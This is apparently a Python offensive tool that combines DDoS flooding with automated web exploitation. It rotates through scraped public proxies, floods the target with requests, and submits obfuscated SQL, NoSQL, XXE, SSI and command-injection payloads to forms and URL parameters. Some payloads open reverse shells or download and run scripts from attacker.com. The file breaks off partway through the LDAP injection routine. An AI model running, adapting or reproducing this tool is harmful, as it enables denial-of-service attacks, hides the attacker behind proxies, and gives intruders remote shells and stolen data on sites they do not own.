#!/usr/bin/env python3
import requests
import argparse
import json
import time
import random
import string
import threading
import queue
import socket
import socks
import urllib.parse
import re
import base64
import hashlib
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

class DDoSExploitTool:
    def __init__(self, target_url, output_file=None, duration=60, threads=50, proxy_file=None, user_agent=None):
        self.target_url = target_url
        self.output_file = output_file
        self.duration = duration
        self.threads = threads
        self.user_agent = user_agent if user_agent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        self.results = {
            "target": target_url,
            "start_time": "",
            "end_time": "",
            "duration": duration,
            "threads": threads,
            "requests_sent": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "vulnerabilities_found": [],
            "proxies_used": 0,
            "proxy_sources": [],
            "attack_methods": []
        }
        
        self.proxies = []
        self.proxy_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.stats_queue = queue.Queue()
        self.vuln_queue = queue.Queue()
        
        # DDoS payloads
        self.ddos_payloads = {
            "http_flood": [
                {"method": "GET", "path": "/"},
                {"method": "GET", "path": "/index.html"},
                {"method": "GET", "path": "/admin"},
                {"method": "GET", "path": "/login"},
                {"method": "GET", "path": "/wp-admin"},
                {"method": "GET", "path": "/phpmyadmin"},
                {"method": "GET", "path": "/api/v1/users"},
                {"method": "GET", "path": "/api/v1/data"},
                {"method": "GET", "path": "/search?q=test"},
                {"method": "GET", "path": "/?id=1"}
            ],
            "post_flood": [
                {"method": "POST", "path": "/login", "data": {"username": "admin", "password": "admin"}},
                {"method": "POST", "path": "/register", "data": {"username": "test", "email": "test@example.com", "password": "test123"}},
                {"method": "POST", "path": "/contact", "data": {"name": "test", "email": "test@example.com", "message": "test message"}},
                {"method": "POST", "path": "/comment", "data": {"post_id": "1", "comment": "test comment"}},
                {"method": "POST", "path": "/api/v1/users", "data": {"username": "test", "email": "test@example.com", "password": "test123"}}
            ],
            "slowloris": [
                {"method": "GET", "path": "/", "headers": {"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"}},
                {"method": "POST", "path": "/submit", "headers": {"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"}, "data": {"field1": "value1", "field2": "value2"}}
            ],
            "cc_attack": [
                {"method": "GET", "path": "/cart/add", "data": {"product_id": "1", "quantity": "1"}},
                {"method": "GET", "path": "/checkout"},
                {"method": "POST", "path": "/checkout", "data": {"payment_method": "credit_card", "card_number": "4111111111111111", "expiry": "12/25", "cvv": "123"}},
                {"method": "GET", "path": "/wishlist/add", "data": {"product_id": "1"}},
                {"method": "POST", "path": "/review", "data": {"product_id": "1", "rating": "5", "comment": "Great product!"}}
            ]
        }
        
        # Exploit payloads
        self.exploit_payloads = {
            "sql_injection": [
                "' OR SLEEP(5)--",
                "' UNION SELECT NULL,username,password FROM users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' OR 1=1--",
                "'; DROP TABLE users--"
            ],
            "blind_sql_injection": [
                "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",
                "' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>97,SLEEP(5),0)--"
            ],
            "nosql_injection": [
                "' || '1'=='1",
                "'; return true; var x='",
                "{'$gt': ''}",
                "{'$where': 'sleep(5000)'}"
            ],
            "command_injection": [
                "; nc -e /bin/bash 127.0.0.1 4444 #",
                "| wget http://attacker.com/shell.php -O /var/www/html/shell.php",
                "`curl http://attacker.com/backdoor.sh|bash`",
                "$(wget http://attacker.com/shell.txt -O /tmp/sh.sh; chmod +x /tmp/sh.sh; /tmp/sh.sh)"
            ],
            "ldap_injection": [
                "*)(&",
                "*)(uid=*))(|(password=*)",
                "*)%00"
            ],
            "xxe_injection": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><replace>&xxe;</replace>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com:80/file\">]><foo>&xxe;</foo>"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "'] | //user[position()=1] | //*[text()='",
                "count(//user[position()=1]/password[text()=])"
            ],
            "ssi_injection": [
                "<!--#exec cmd=\"nc -e /bin/bash 127.0.0.1 4444\" -->",
                "<!--#include virtual=\"/etc/passwd\"-->",
                "<!--#exec cmd=\"wget http://attacker.com/shell.php -O /var/www/html/shell.php\" -->"
            ],
            "xss": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg onload=alert(document.domain)>",
                "javascript:alert(document.cookie)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/var/www/html/../../../etc/passwd"
            ],
            "ssrf": [
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "file:///etc/passwd"
            ],
            "rfi": [
                "http://attacker.com/shell.txt",
                "https://attacker.com/shell.txt",
                "ftp://attacker.com/shell.txt"
            ],
            "lfi": [
                "/etc/passwd",
                "/proc/self/environ",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "jwt_none": [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VySWQiOiIxMjM0In0.",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiIxMjM0In0."
            ],
            "xml_bomb": [
                """<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""
            ],
            "weak_credentials": [
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("admin", "root"),
                ("root", "root"),
                ("administrator", "administrator"),
                ("admin", ""),
                ("", "admin")
            ],
            "idor": [
                ("id", "increment"),
                ("user_id", "increment"),
                ("account_id", "increment"),
                ("uid", "increment")
            ],
            "csrf": [
                ("csrf_token", "remove"),
                ("csrfmiddlewaretoken", "remove"),
                ("_token", "remove"),
                ("authenticity_token", "remove")
            ],
            "cors": [
                ("Origin", "https://evil.com"),
                ("Origin", "null"),
                ("Origin", "http://localhost")
            ],
            "http_methods": [
                "PUT", "DELETE", "TRACE", "CONNECT", "PATCH"
            ],
            "backup_files": [
                "backup.zip", "backup.tar.gz", "backup.sql", "backup.bak",
                "site.zip", "site.tar.gz", "wp-config.php.bak", ".env.bak",
                "config.php.bak", "configuration.php.bak", "database.sql",
                ".git", ".svn", ".DS_Store", "web.config.bak"
            ],
            "common_dirs": [
                "admin", "administrator", "login", "wp-admin", "wp-login",
                "phpmyadmin", "myadmin", "pma", "mysql", "sqladmin",
                "backup", "config", "setup", "install", "test", "dev", "staging"
            ]
        }
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ]
        
        # Referers
        self.referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.youtube.com/",
            "https://www.reddit.com/"
        ]
        
        # Proxy sources
        self.proxy_sources = [
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
        ]
        
        # Load proxies from file if provided
        if proxy_file:
            self.load_proxies_from_file(proxy_file)
    
    def load_proxies_from_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                proxies = f.read().splitlines()
            
            for proxy in proxies:
                if proxy.strip():
                    self.proxies.append(proxy.strip())
            
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies from {file_path}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading proxies from file: {str(e)}")
    
    def fetch_proxies(self):
        print(f"{Fore.YELLOW}[+] Fetching proxies from online sources...")
        
        for source in self.proxy_sources:
            try:
                print(f"{Fore.BLUE}[*] Fetching proxies from {source}")
                response = requests.get(source, verify=False, timeout=30)
                proxies = response.text.splitlines()
                
                for proxy in proxies:
                    if proxy.strip():
                        self.proxies.append(proxy.strip())
                
                print(f"{Fore.GREEN}[+] Fetched {len(proxies)} proxies from {source}")
                self.results["proxy_sources"].append(source)
            except Exception as e:
                print(f"{Fore.RED}[-] Error fetching proxies from {source}: {str(e)}")
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{Fore.GREEN}[+] Total unique proxies: {len(self.proxies)}")
        
        # Add proxies to queue
        for proxy in self.proxies:
            self.proxy_queue.put(proxy)
        
        self.results["proxies_used"] = len(self.proxies)
    
    def test_proxy(self, proxy):
        parsed_url = urllib.parse.urlparse(self.target_url)
        target_host = parsed_url.netloc
        target_port = 443 if parsed_url.scheme == "https" else 80
        
        proxy_parts = proxy.split(":")
        if len(proxy_parts) != 2:
            return False
        
        proxy_host = proxy_parts[0]
        proxy_port = int(proxy_parts[1])
        
        try:
            # Test HTTP proxy
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((proxy_host, proxy_port))
            
            # Connect to target through proxy
            connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            s.send(connect_request.encode())
            
            response = s.recv(4096).decode()
            s.close()
            
            if "200 Connection established" in response:
                return True
            
            return False
        except Exception as e:
            return False
    
    def test_proxies(self):
        print(f"{Fore.YELLOW}[+] Testing proxies...")
        
        working_proxies = []
        
        for proxy in self.proxies:
            if self.test_proxy(proxy):
                working_proxies.append(proxy)
                print(f"{Fore.GREEN}[+] Proxy {proxy} is working")
            else:
                print(f"{Fore.RED}[-] Proxy {proxy} is not working")
        
        self.proxies = working_proxies
        print(f"{Fore.GREEN}[+] Working proxies: {len(self.proxies)}")
        
        # Add working proxies to queue
        for proxy in self.proxies:
            self.proxy_queue.put(proxy)
        
        self.results["proxies_used"] = len(self.proxies)
    
    def obfuscate_payload(self, payload):
        # Simple obfuscation techniques
        obfuscated = payload
        
        # Replace common keywords with alternative representations
        obfuscated = obfuscated.replace("script", "scr\u0069pt")
        obfuscated = obfuscated.replace("alert", "al\u0065rt")
        obfuscated = obfuscated.replace("document", "doc\u0075ment")
        obfuscated = obfuscated.replace("cookie", "coo\u006bie")
        
        # Add random comments
        if random.choice([True, False]):
            comment = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
            obfuscated = obfuscated.replace(">", f"<!--{comment}-->")
        
        # Encode parts in different encodings
        if random.choice([True, False]):
            parts = obfuscated.split(" ")
            for i in range(len(parts)):
                if random.choice([True, False]) and len(parts[i]) > 3:
                    parts[i] = parts[i].replace(parts[i][1:-1], urllib.parse.quote(parts[i][1:-1]))
            obfuscated = " ".join(parts)
        
        return obfuscated
    
    def check_sql_injection(self, response):
        errors = [
            "you have an error in your sql syntax",
            "warning: mysql_fetch_assoc()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql query failed",
            "syntax error",
            "unexpected end of sql command",
            "microsoft ole db provider for odbc drivers error",
            "ora-00936: missing expression",
            "microsoft jet database engine error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for time-based SQLi
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def check_blind_sql_injection(self, response, elapsed_time):
        if elapsed_time > 4:  # Time-based detection
            return True
        return False
    
    def check_nosql_injection(self, response):
        errors = [
            "syntaxerror",
            "unexpected token",
            "bson",
            "mongodb",
            "error parsing",
            "invalid object",
            "casterror"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def check_command_injection(self, response, elapsed_time):
        errors = [
            "sh: command not found",
            "bash: command not found",
            "cmd.exe not found",
            "command failed",
            "syntax error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for time-based command injection
        if elapsed_time > 4:
            return True
            
        # Check for command output
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def check_ldap_injection(self, response):
        errors = [
            "ldap_search()",
            "ldap_bind()",
            "ldap_connect()",
            "invalid dn syntax",
            "operations error",
            "protocol error",
            "timelimit exceeded",
            "sizelimit exceeded",
            "strongauth required",
            " referral"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def check_xxe_injection(self, response):
        errors = [
            "xml parsing error",
            "xml declaration allowed only at the start of the document",
            "failed to parse external entity",
            "external entity processing is disabled",
            "entity resolution not possible"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        # Check for base64 encoded file content
        if "PD9waHAg" in content or "cm9vdDp4OjA6" in content:
            return True
            
        return False
    
    def check_xpath_injection(self, response):
        errors = [
            "xpath error",
            "xpath parsing error",
            "xpath query failed",
            "invalid xpath expression",
            "xpath syntax error"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for successful authentication bypass
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def check_ssi_injection(self, response):
        errors = [
            "[an error occurred while processing this directive]",
            "ssi error",
            "invalid ssi directive"
        ]
        
        content = response.text.lower()
        for error in errors:
            if error in content:
                return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def check_xss(self, response, payload):
        content = response.text.lower()
        
        # Check if the payload is reflected in the response
        if payload.lower() in content:
            return True
        
        # Check for common XSS patterns
        xss_patterns = [
            "<script>alert",
            "onerror=alert",
            "javascript:alert",
            "<svg onload=alert"
        ]
        
        for pattern in xss_patterns:
            if pattern in content:
                return True
                
        return False
    
    def check_path_traversal(self, response):
        content = response.text.lower()
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
        
        # Check for Windows file content
        if "for 16-bit app support" in content or "[fonts]" in content or "[extensions]" in content:
            return True
            
        return False
    
    def check_ssrf(self, response):
        content = response.text.lower()
        
        # Check for AWS metadata
        if "ami-id" in content or "instance-id" in content or "hostname" in content:
            return True
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
            
        return False
    
    def check_rfi(self, response):
        content = response.text.lower()
        
        # Check for common shell indicators
        if "shell_exec" in content or "passthru" in content or "system(" in content or "exec(" in content:
            return True
            
        return False
    
    def check_lfi(self, response):
        content = response.text.lower()
        
        # Check for file content disclosure
        if "root:" in content or "daemon:" in content or "bin:" in content:
            return True
        
        # Check for Windows file content
        if "for 16-bit app support" in content or "[fonts]" in content or "[extensions]" in content:
            return True
            
        return False
    
    def check_jwt_none(self, response):
        content = response.text.lower()
        
        # Check for successful authentication
        if "welcome" in content.lower() or "dashboard" in content.lower() or "admin" in content.lower():
            return True
            
        return False
    
    def check_xml_bomb(self, response, elapsed_time):
        if elapsed_time > 10:  # Check for DoS
            return True
        return False
    
    def check_weak_credentials(self, response):
        content = response.text.lower()
        
        # Check for successful login indicators
        if "welcome" in content.lower() or "dashboard" in content.lower() or "logout" in content.lower() or "profile" in content.lower():
            return True
        
        # Check for redirect after login
        if response.status_code == 302 and "location" in response.headers:
            return True
            
        return False
    
    def check_idor(self, response):
        if response.status_code == 200 and len(response.text) > 100:
            return True
        return False
    
    def check_csrf(self, response):
        content = response.text.lower()
        
        # Check for successful action without CSRF token
        if "success" in content or "updated" in content or "deleted" in content or "created" in content:
            return True
            
        return False
    
    def check_cors(self, response):
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            
            # Check if any origin is allowed
            if allowed_origin == "*":
                return True
            
            # Check if our evil origin is allowed
            elif allowed_origin == "https://evil.com" or allowed_origin == "null" or allowed_origin == "http://localhost":
                return True
                
        return False
    
    def check_backup_files(self, response):
        if response.status_code == 200:
            return True
        return False
    
    def check_common_dirs(self, response):
        if response.status_code == 200:
            return True
        return False
    
    def get_forms(self, url, response):
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            
            action = form.attrs.get("action", "").lower()
            if not action.startswith("http"):
                action = urllib.parse.urljoin(url, action)
            
            method = form.attrs.get("method", "get").lower()
            
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                input_value = input_tag.attrs.get("value", "")
                inputs.append({
                    "type": input_type,
                    "name": input_name,
                    "value": input_value
                })
            
            for select_tag in form.find_all("select"):
                select_name = select_tag.attrs.get("name")
                options = []
                for option in select_tag.find_all("option"):
                    option_value = option.attrs.get("value", "")
                    options.append(option_value)
                
                inputs.append({
                    "type": "select",
                    "name": select_name,
                    "options": options
                })
            
            for textarea_tag in form.find_all("textarea"):
                textarea_name = textarea_tag.attrs.get("name")
                textarea_value = textarea_tag.text.strip()
                
                inputs.append({
                    "type": "textarea",
                    "name": textarea_name,
                    "value": textarea_value
                })
            
            form_details["action"] = action
            form_details["method"] = method
            form_details["inputs"] = inputs
            
            forms.append(form_details)
        
        return forms
    
    def submit_form(self, form_details, url, payload, input_name=None):
        target_url = form_details["action"]
        
        data = {}
        for input in form_details["inputs"]:
            if input["type"] == "submit" or input["type"] == "button":
                continue
            if input_name and input["name"] == input_name:
                data[input["name"]] = payload
            else:
                data[input["name"]] = input["value"]
        
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, verify=False, timeout=10)
        else:
            return requests.get(target_url, params=data, verify=False, timeout=10)
    
    def sql_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["sql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_sql_injection(response):
                                vuln = {
                                    "type": "SQL Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "SQL error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SQL Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["sql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_sql_injection(response):
                                vuln = {
                                    "type": "SQL Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "SQL error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] SQL Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def blind_sql_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["blind_sql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            start_time = time.time()
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            end_time = time.time()
                            
                            if self.check_blind_sql_injection(response, end_time - start_time):
                                vuln = {
                                    "type": "Blind SQL Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": f"Time delay: {end_time - start_time} seconds"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Blind SQL Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["blind_sql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            start_time = time.time()
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            end_time = time.time()
                            
                            if self.check_blind_sql_injection(response, end_time - start_time):
                                vuln = {
                                    "type": "Blind SQL Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": f"Time delay: {end_time - start_time} seconds"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Blind SQL Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def nosql_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["nosql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            
                            if self.check_nosql_injection(response):
                                vuln = {
                                    "type": "NoSQL Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "NoSQL error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] NoSQL Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["nosql_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            
                            if self.check_nosql_injection(response):
                                vuln = {
                                    "type": "NoSQL Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "NoSQL error detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] NoSQL Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def command_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["command_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            start_time = time.time()
                            response = self.submit_form(form, self.target_url, obfuscated_payload, input["name"])
                            end_time = time.time()
                            
                            if self.check_command_injection(response, end_time - start_time):
                                vuln = {
                                    "type": "Command Injection",
                                    "url": self.target_url,
                                    "method": form["method"],
                                    "parameter": input["name"],
                                    "payload": obfuscated_payload,
                                    "evidence": "Command injection detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Command Injection found: {input['name']} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                # Test URL parameters
                parsed_url = urllib.parse.urlparse(self.target_url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        for payload in self.exploit_payloads["command_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
                            test_params = params.copy()
                            test_params[param] = obfuscated_payload
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                            
                            start_time = time.time()
                            response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                            end_time = time.time()
                            
                            if self.check_command_injection(response, end_time - start_time):
                                vuln = {
                                    "type": "Command Injection",
                                    "url": self.target_url,
                                    "method": "GET",
                                    "parameter": param,
                                    "payload": obfuscated_payload,
                                    "evidence": "Command injection detected"
                                }
                                self.vuln_queue.put(vuln)
                                print(f"{Fore.GREEN}[!] Command Injection found: {param} parameter in {self.target_url}")
                                break
                            
                            self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def ldap_injection_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                # Get forms from target
                response = requests.get(self.target_url, proxies=proxy_dict, verify=False, timeout=10)
                forms = self.get_forms(self.target_url, response)
                
                for form in forms:
                    for input in form["inputs"]:
                        if input["type"] == "hidden" or input["type"] == "submit":
                            continue
                        
                        for payload in self.exploit_payloads["ldap_injection"]:
                            obfuscated_payload = self.obfuscate_payload(payload)
